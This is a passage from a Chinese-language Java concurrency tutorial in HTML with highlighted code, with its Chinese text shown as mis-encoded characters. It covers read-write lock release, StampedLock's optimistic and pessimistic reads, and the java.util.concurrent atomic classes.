        <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
        <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
            rh = readHolds.get();
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> rh.count;
        <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">1</span>) {
            readHolds.remove();
            <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> unmatchedUnlockException();
        }
        --rh.count;
    }
    
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c - SHARED_UNIT;
        <span class="hljs-keyword">if</span> (compareAndSetState(c, nextc))
            <span class="hljs-keyword">return</span> nextc == <span class="hljs-number">0</span>;
    }
}
</code></pre>
<h4 data-id="heading-183">å†™é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong> è§ä¸Šé¢çš„tryAcquireæ–¹æ³•</p>
<p><strong>å†™é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> getState() - releases;
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> exclusiveCount(nextc) == <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (free)
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    setState(nextc);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<h3 data-id="heading-184">8.4 StampedLock</h3>
<h4 data-id="heading-185">StampedLockçš„ç‰¹ç‚¹</h4>
<p><strong>StampedLock</strong>æ˜¯JDK 8å¼•å…¥çš„æ–°é”ï¼Œæä¾›äº†ä¸‰ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>å†™é”ï¼ˆWritingï¼‰</strong>ï¼šç‹¬å é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„å†™é”</li>
<li><strong>æ‚²è§‚è¯»é”ï¼ˆReadingï¼‰</strong>ï¼šå…±äº«é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li><strong>ä¹è§‚è¯»é”ï¼ˆOptimistic Readingï¼‰</strong>ï¼šä¸é˜»å¡ï¼Œé€šè¿‡éªŒè¯æˆ³è®°æ¥æ£€æŸ¥æ•°æ®æ˜¯å¦è¢«ä¿®æ”¹</li>
</ol>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸æ”¯æŒé‡å…¥</li>
<li>ä¸æ”¯æŒCondition</li>
<li>æ€§èƒ½ä¼˜äºReentrantReadWriteLockï¼ˆç‰¹åˆ«æ˜¯åœ¨è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼‰</li>
</ul>
<h4 data-id="heading-186">ä¹è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.StampedLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StampedLockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å°è¯•ä¹è§‚è¯»</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.tryOptimisticRead();
        <span class="hljs-type">double</span> <span class="hljs-variable">curX</span> <span class="hljs-operator">=</span> x, curY = y;
        
        <span class="hljs-comment">// 2. éªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆï¼ˆæ£€æŸ¥æ˜¯å¦æœ‰å†™æ“ä½œï¼‰</span>
        <span class="hljs-keyword">if</span> (!lock.validate(stamp)) {
            <span class="hljs-comment">// 3. æˆ³è®°æ— æ•ˆï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</span>
            stamp = lock.readLock();
            <span class="hljs-keyword">try</span> {
                curX = x;
                curY = y;
            } <span class="hljs-keyword">finally</span> {
                lock.unlockRead(stamp);
            }
        }
        
        <span class="hljs-keyword">return</span> Math.sqrt(curX * curX + curY * curY);
    }
}
</code></pre>
<p><strong>ä¹è§‚è¯»çš„æµç¨‹ï¼š</strong></p>
<ol>
<li><code>tryOptimisticRead()</code>ï¼šè·å–ä¹è§‚è¯»æˆ³è®°ï¼Œä¸é˜»å¡</li>
<li>è¯»å–æ•°æ®</li>
<li><code>validate(stamp)</code>ï¼šéªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆ
<ul>
<li>æœ‰æ•ˆï¼šè¯´æ˜æ²¡æœ‰å†™æ“ä½œï¼Œè¯»å–æˆåŠŸ</li>
<li>æ— æ•ˆï¼šè¯´æ˜æœ‰å†™æ“ä½œï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</li>
</ul>
</li>
</ol>
<h4 data-id="heading-187">æ‚²è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// è·å–æ‚²è§‚è¯»é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.readLock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> x + y;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockRead(stamp);
    }
}
</code></pre>
<p><strong>æ‚²è§‚è¯»é”ï¼š</strong></p>
<ul>
<li>ç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>ä¸å†™é”äº’æ–¥</li>
</ul>
<h4 data-id="heading-188">å†™é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> {
    <span class="hljs-comment">// è·å–å†™é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.writeLock();
    <span class="hljs-keyword">try</span> {
        x += deltaX;
        y += deltaY;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockWrite(stamp);
    }
}
</code></pre>
<p><strong>å†™é”ï¼š</strong></p>
<ul>
<li>ç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
<li>ä¸è¯»é”å’Œå†™é”éƒ½äº’æ–¥</li>
</ul>
<h4 data-id="heading-189">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>æ€§èƒ½æµ‹è¯•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockPerformanceComparison</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">stampedLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    
    <span class="hljs-comment">// ReentrantReadWriteLock</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithRWLock</span><span class="hljs-params">()</span> {
        rwLock.readLock().lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è¯»æ“ä½œ</span>
        } <span class="hljs-keyword">finally</span> {
            rwLock.readLock().unlock();
        }
    }
    
    <span class="hljs-comment">// StampedLockä¹è§‚è¯»</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithStampedLock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampedLock.tryOptimisticRead();
        <span class="hljs-comment">// è¯»æ“ä½œ</span>
        <span class="hljs-keyword">if</span> (!stampedLock.validate(stamp)) {
            stamp = stampedLock.readLock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è¯»æ“ä½œ</span>
            } <span class="hljs-keyword">finally</span> {
                stampedLock.unlockRead(stamp);
            }
        }
    }
}
</code></pre>
<p><strong>æ€§èƒ½ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼šStampedLockï¼ˆä¹è§‚è¯»ï¼‰æ€§èƒ½æœ€å¥½</li>
<li><strong>å†™å¤šè¯»å°‘</strong>ï¼šæ€§èƒ½æ¥è¿‘</li>
<li><strong>è¯»æ“ä½œå æ¯”é«˜</strong>ï¼šStampedLockä¼˜åŠ¿æ˜æ˜¾ï¼ˆå‡å°‘é”ç«äº‰ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨å»ºè®®ï¼š</strong></p>
<ul>
<li>è¯»å¤šå†™å°‘ï¼šä¼˜å…ˆä½¿ç”¨StampedLock</li>
<li>éœ€è¦é‡å…¥ï¼šä½¿ç”¨ReentrantReadWriteLock</li>
<li>éœ€è¦Conditionï¼šä½¿ç”¨ReentrantReadWriteLock</li>
</ul>
<hr/>
<h2 data-id="heading-190">ç¬¬ä¹ç«  åŸå­ç±»ï¼ˆAtomicï¼‰</h2>
<h3 data-id="heading-191">9.1 åŸå­ç±»æ¦‚è¿°</h3>
<h4 data-id="heading-192">åŸå­ç±»çš„åˆ†ç±»</h4>
<p>Javaä¸­çš„åŸå­ç±»åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p>
<p><strong>1. åŸºæœ¬ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicInteger</code> - åŸå­æ•´å‹</li>
<li><code>AtomicLong</code> - åŸå­é•¿æ•´å‹</li>
<li><code>AtomicBoolean</code> - åŸå­å¸ƒå°”å‹</li>
</ul>
<p><strong>2. æ•°ç»„ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicIntegerArray</code> - åŸå­æ•´å‹æ•°ç»„</li>
<li><code>AtomicLongArray</code> - åŸå­é•¿æ•´å‹æ•°ç»„</li>
<li><code>AtomicReferenceArray</code> - åŸå­å¼•ç”¨æ•°ç»„</li>
</ul>
<p><strong>3. å¼•ç”¨ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicReference</code> - åŸå­å¼•ç”¨</li>
<li><code>AtomicStampedReference</code> - å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ï¼ˆè§£å†³ABAé—®é¢˜ï¼‰</li>
<li><code>AtomicMarkableReference</code> - å¸¦æ ‡è®°ä½çš„åŸå­å¼•ç”¨</li>
</ul>
<p><strong>4. å­—æ®µæ›´æ–°å™¨</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code> - æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicLongFieldUpdater</code> - é•¿æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicReferenceFieldUpdater</code> - å¼•ç”¨ç±»å‹å­—æ®µæ›´æ–°å™¨</li>
</ul>
<p><strong>5. ç´¯åŠ å™¨ç±»ï¼ˆJDK 8+ï¼‰</strong></p>
<ul>
<li><code>LongAdder</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>LongAccumulator</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>DoubleAdder</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
<li><code>DoubleAccumulator</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
</ul>
<h4 data-id="heading-193">åŸå­ç±»çš„ä¼˜åŠ¿</h4>
<p><strong>1. æ— é”ç¼–ç¨‹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼ˆéœ€è¦é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;
}

<span class="hljs-comment">// åŸå­ç±»æ–¹å¼ï¼ˆæ— é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();
}
</code></pre>
<p><strong>2. é«˜æ€§èƒ½</strong></p>
<ul>
<li>ä½¿ç”¨CASæ“ä½œï¼Œé¿å…çº¿ç¨‹é˜»å¡</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½ä¼˜äºsynchronized</li>
<li>é€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
</ul>
<p><strong>3. çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„</li>
<li>ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€é¢å¤–çš„åŒæ­¥æœºåˆ¶</li>
</ul>
<p><strong>4. ç®€å•æ˜“ç”¨</strong></p>
<ul>
<li>APIç®€æ´æ˜äº†</li>
<li>ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†é”</li>
</ul>
<h3 data-id="heading-194">9.2 åŸºæœ¬ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-195">AtomicInteger</h4>
<p><strong>AtomicIntegerå¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// åŸºæœ¬æ“ä½œ</span>
count.get();                           <span class="hljs-comment">// è·å–å€¼</span>
count.set(<span class="hljs-number">10</span>);                         <span class="hljs-comment">// è®¾ç½®å€¼</span>
count.getAndSet(<span class="hljs-number">20</span>);                   <span class="hljs-comment">// è·å–æ—§å€¼å¹¶è®¾ç½®æ–°å€¼</span>
count.compareAndSet(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>);          <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>

<span class="hljs-comment">// è‡ªå¢è‡ªå‡</span>
count.incrementAndGet();               <span class="hljs-comment">// ++countï¼Œè¿”å›æ–°å€¼</span>
count.getAndIncrement();               <span class="hljs-comment">// count++ï¼Œè¿”å›æ—§å€¼</span>
count.decrementAndGet();               <span class="hljs-comment">// --countï¼Œè¿”å›æ–°å€¼</span>
count.getAndDecrement();               <span class="hljs-comment">// count--ï¼Œè¿”å›æ—§å€¼</span>

<span class="hljs-comment">// åŠ å‡æ“ä½œ</span>
count.addAndGet(<span class="hljs-number">5</span>);                    <span class="hljs-comment">// åŠ 5ï¼Œè¿”å›æ–°å€¼</span>
count.getAndAdd(<span class="hljs-number">10</span>);                   <span class="hljs-comment">// è¿”å›æ—§å€¼ï¼Œå†åŠ 10</span>

<span class="hljs-comment">// å‡½æ•°å¼æ›´æ–°ï¼ˆJDK 8+ï¼‰</span>
count.updateAndGet(x -&gt; x * <span class="hljs-number">2</span>);        <span class="hljs-comment">// åŸå­æ›´æ–°</span>
count.getAndUpdate(x -&gt; x / <span class="hljs-number">2</span>);        <span class="hljs-comment">// è·å–å¹¶æ›´æ–°</span>
</code></pre>
<p><strong>ç®€å•åº”ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œæ— éœ€é”</span>
}
</code></pre>
<h4 data-id="heading-196">AtomicLong</h4>
<p><strong>AtomicLongä¸AtomicIntegerç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLong</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0L</span>);
total.addAndGet(<span class="hljs-number">100</span>);                  <span class="hljs-comment">// å¢åŠ 100</span>
total.get();                           <span class="hljs-comment">// è·å–å€¼</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>åœ¨32ä½JVMä¸Šï¼Œlongçš„è¯»å†™ä¸æ˜¯åŸå­çš„</li>
<li>AtomicLongä¿è¯longç±»å‹çš„åŸå­æ“ä½œ</li>
<li>JDK 8+æ¨èä½¿ç”¨LongAdderï¼Œæ€§èƒ½æ›´å¥½</li>
</ul>
<h4 data-id="heading-197">AtomicBoolean</h4>
<p><strong>AtomicBooleanç”¨äºå¸ƒå°”ç±»å‹çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);
flag.get();                            <span class="hljs-comment">// è·å–å€¼</span>
flag.set(<span class="hljs-literal">true</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
flag.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
flag.getAndSet(<span class="hljs-literal">false</span>);                <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
flag.lazySet(<span class="hljs-literal">true</span>);                   <span class="hljs-comment">// å»¶è¿Ÿè®¾ç½®</span>
</code></pre>
<p><strong>çŠ¶æ€æ ‡å¿—ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">true</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    running.set(<span class="hljs-literal">false</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (running.get()) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    }
}
</code></pre>
<h4 data-id="heading-198">å¸¸ç”¨æ–¹æ³•æ€»ç»“</h4>
<p><strong>æ‰€æœ‰åŸºæœ¬ç±»å‹åŸå­ç±»éƒ½æä¾›ä»¥ä¸‹æ–¹æ³•ï¼š</strong></p>

































































<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td><code>get()</code></td><td>è·å–å½“å‰å€¼</td><td>å½“å‰å€¼</td></tr><tr><td><code>set(int newValue)</code></td><td>è®¾ç½®æ–°å€¼</td><td>void</td></tr><tr><td><code>getAndSet(int newValue)</code></td><td>è·å–å½“å‰å€¼å¹¶è®¾ç½®æ–°å€¼</td><td>æ—§å€¼</td></tr><tr><td><code>compareAndSet(int expect, int update)</code></td><td>æ¯”è¾ƒå¹¶è®¾ç½®</td><td>boolean</td></tr><tr><td><code>lazySet(int newValue)</code></td><td>å»¶è¿Ÿè®¾ç½®ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰</td><td>void</td></tr><tr><td><code>getAndIncrement()</code></td><td>å…ˆè¿”å›å†è‡ªå¢</td><td>æ—§å€¼</td></tr><tr><td><code>incrementAndGet()</code></td><td>å…ˆè‡ªå¢å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndDecrement()</code></td><td>å…ˆè¿”å›å†è‡ªå‡</td><td>æ—§å€¼</td></tr><tr><td><code>decrementAndGet()</code></td><td>å…ˆè‡ªå‡å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndAdd(int delta)</code></td><td>å…ˆè¿”å›å†åŠ </td><td>æ—§å€¼</td></tr><tr><td><code>addAndGet(int delta)</code></td><td>å…ˆåŠ å†è¿”å›</td><td>æ–°å€¼</td></tr></tbody></table>
<h3 data-id="heading-199">9.3 æ•°ç»„ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-200">AtomicIntegerArray</h4>
<p><strong>AtomicIntegerArrayç”¨äºåŸå­åœ°æ›´æ–°æ•°ç»„ä¸­çš„å…ƒç´ ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicIntegerArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicIntegerArray</span>(<span class="hljs-number">10</span>);
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–ç´¢å¼•0çš„å€¼</span>
array.set(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);                      <span class="hljs-comment">// è®¾ç½®ç´¢å¼•0çš„å€¼</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.incrementAndGet(<span class="hljs-number">0</span>);             <span class="hljs-comment">// ç´¢å¼•0è‡ªå¢</span>
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);                <span class="hljs-comment">// ç´¢å¼•0åŠ 5</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>æ•°ç»„é•¿åº¦åœ¨åˆ›å»ºæ—¶ç¡®å®šï¼Œä¸èƒ½æ”¹å˜</li>
<li>æ¯ä¸ªå…ƒç´ éƒ½æ˜¯åŸå­æ“ä½œçš„</li>
<li>ä¸åŒç´¢å¼•çš„å…ƒç´ å¯ä»¥å¹¶å‘è®¿é—®</li>
</ul>
<h4 data-id="heading-201">AtomicLongArray</h4>
<p><strong>AtomicLongArrayä¸AtomicIntegerArrayç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹æ•°ç»„ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLongArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLongArray</span>(<span class="hljs-number">10</span>);
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>);               <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerArray</span>
</code></pre>
<h4 data-id="heading-202">AtomicReferenceArray</h4>
<p><strong>AtomicReferenceArrayç”¨äºå¼•ç”¨ç±»å‹æ•°ç»„çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReferenceArray&lt;String&gt; array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReferenceArray</span>&lt;&gt;(<span class="hljs-number">10</span>);
array.set(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>);                 <span class="hljs-comment">// è®¾ç½®å…ƒç´ </span>
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–å…ƒç´ </span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>, <span class="hljs-string">"World"</span>);  <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Java"</span>);           <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-203">9.4 å¼•ç”¨ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-204">AtomicReference</h4>
<p><strong>AtomicReferenceç”¨äºåŸå­åœ°æ›´æ–°å¼•ç”¨ç±»å‹å˜é‡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"åˆå§‹å€¼"</span>);
ref.get();                              <span class="hljs-comment">// è·å–å€¼</span>
ref.set(<span class="hljs-string">"æ–°å€¼"</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
ref.compareAndSet(<span class="hljs-string">"æ–°å€¼"</span>, <span class="hljs-string">"æ›´æ–°å€¼"</span>);   <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
ref.getAndSet(<span class="hljs-string">"æœ€ç»ˆå€¼"</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<p><strong>å•ä¾‹æ¨¡å¼åº”ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> AtomicReference&lt;Singleton&gt; instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Singleton</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> instance.get();
    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">null</span>) {
        current = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
        <span class="hljs-keyword">if</span> (instance.compareAndSet(<span class="hljs-literal">null</span>, current)) {
            <span class="hljs-keyword">return</span> current;
        }
        <span class="hljs-keyword">return</span> instance.get();
    }
    <span class="hljs-keyword">return</span> current;
}
</code></pre>
<h4 data-id="heading-205">AtomicStampedReference</h4>
<p><strong>AtomicStampedReferenceé€šè¿‡ç‰ˆæœ¬å·è§£å†³ABAé—®é¢˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, stamp, stamp + <span class="hljs-number">1</span>);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, stamp + <span class="hljs-number">2</span>);
</code></pre>
<h4 data-id="heading-206">AtomicMarkableReference</h4>
<p><strong>AtomicMarkableReferenceä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ã€‚</strong></p>
